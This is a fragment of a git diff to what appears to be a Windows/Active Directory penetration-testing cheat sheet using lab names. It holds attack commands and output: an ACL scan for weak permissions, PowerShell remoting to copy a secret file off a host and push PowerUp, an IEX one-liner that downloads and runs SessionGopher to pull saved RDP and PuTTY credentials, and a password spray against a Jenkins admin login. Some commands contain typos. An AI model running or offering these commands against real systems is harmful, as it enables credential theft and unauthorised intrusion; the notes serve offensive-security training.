-# Looking for weak ACL in domain
-```
-Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
-```
+## Misc
 # File Transfer
 ```
 $ses = New=PsSesion -ComputerName HYDRA
@@ -720,42 +297,4 @@ Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt
 
 $ses = New=PsSesion -ComputerName HYDRA
 Copy-Item -ToSession $ses -Path  C:\Users\punisher\Desktop\powerup.ps1 -Destiantion C:\Users\Random\powerup.ps1
-```
-# Other
-Extract RDP, Putty sessions form Registry:
-
-```
-PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher                                         
-          o_
-         /  ".   SessionGopher
-       ,"  _-"
-     ,"   m m
-  ..+     )      Brandon Arvanaghi
-     `m..m       Twitter: @arvanaghi | arvanaghi.com
-
-[+] Digging on Spiderman ...
-Microsoft Remote Desktop (RDP) Sessions
-
-
-Source   : Spiderman\pparker
-Hostname : 192.168.22.211
-Username : MARVEL\Administrator
-
-```
-
-Bruteforce password on Jenkins instance
-
-```
-PS C:\Users\punishell\Desktop\> Invoke-JenkinsPasswordSpray -URL http://192.168.22.55:8080 -Username 'admin' -PasswordFile .\10k-worst-passwords.txt
-[+] Will use this URL: http://192.168.22.55:8080
-[+] Testing if URL is valid
-[+] Provided URL: http://192.168.22.55:8080 returns 200 OK.
-
-Confirm Password Spray
-Are you sure you want to password spray the URL http://192.168.22.55:8080 with 1 accounts and 10000 passwords?
-[Y] Yes  [N] No  [?] Help (default is "Y"): y
-
-[+] Start password spraying the URL http://192.168.22.55:8080 with 1 user(s) and 10000 password(s). Total request count is 10000. Current time is 12:30 PM. Successful logins will be written to
-[Attempt 1 / 10000] - Spraying username:admin with password:password
-The ContinueOnSuccess parameter is set to False or not set. Spraying will now stop
 ```
